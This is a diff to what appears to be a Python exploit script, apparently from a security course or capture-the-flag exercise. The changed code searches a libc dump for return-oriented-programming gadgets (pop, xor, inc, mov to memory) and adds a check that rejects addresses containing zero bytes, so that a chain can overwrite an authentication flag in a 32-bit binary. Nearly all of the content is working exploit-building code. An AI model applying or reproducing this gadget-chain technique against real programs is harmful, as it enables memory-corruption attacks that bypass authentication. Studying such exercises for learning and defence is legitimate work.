@@ -12,6 +12,17 @@ AUTH_ADDR = 0x0804A054
 FINAL_RET_ADDR = 0x080488c6
 
 
+def noZeroByte(x):
+    # return true iff there isnt a zero byte in x
+    mask = 0xff
+    for i in range(4):
+        byte = x & mask
+        mask <<= 8
+        if(byte == 0):
+            return False
+    return True
+
+
 def get_arg():
     s = GadgetSearch(LIBC_DUMP_PATH, DUMP_START_ADDR)
     possible_regs = [
@@ -23,24 +34,24 @@ def get_arg():
     for perm in s.get_register_combos(2, possible_regs):
         reg1 = perm[0]
         reg2 = perm[1]
-        pop_all = s.find_all('pop {0}'.format(reg1))
-        if(len(pop_all) == 0):
-            continue  # didnt find instruction with reg1
-        xor_all = s.find_all('xor {0},{0}'.format(reg2))
-        if(len(xor_all) == 0):
-            continue  # didnt find instruction with reg2
-        inc_all = s.find_all('inc {0}'.format(reg2))
-        if(len(inc_all) == 0):
-            continue  # didnt find instruction with reg2
-        mov_all = s.find_all('mov [{0}],{1}'.format(reg1, reg2))
-        if(len(mov_all) == 0):
-            continue  # didnt find instruction with reg2
+        try:
+            pop_reg1 = s.find('pop {0}'.format(reg1), noZeroByte)
+        except Exception:
+            continue
+        try:
+            xor_reg2_reg2 = s.find('xor {0},{0}'.format(reg2), noZeroByte)
+        except Exception:
+            continue
+        try:
+            inc_reg2 = s.find('inc {0}'.format(reg2), noZeroByte)
+        except Exception:
+            continue
+        try:
+            mov_memReg1_reg2 = s.find('mov [{0}],{1}'.format(reg1, reg2), noZeroByte)
+        except Exception:
+            continue
         # if got to this point then we found 2 suitable registers
         # and addresses to instructions that we need
-        pop_reg1 = pop_all[0]
-        xor_reg2_reg2 = xor_all[0]
-        inc_reg2 = inc_all[0]
-        mov_memReg1_reg2 = mov_all[0]
         break
 
     offset = 66
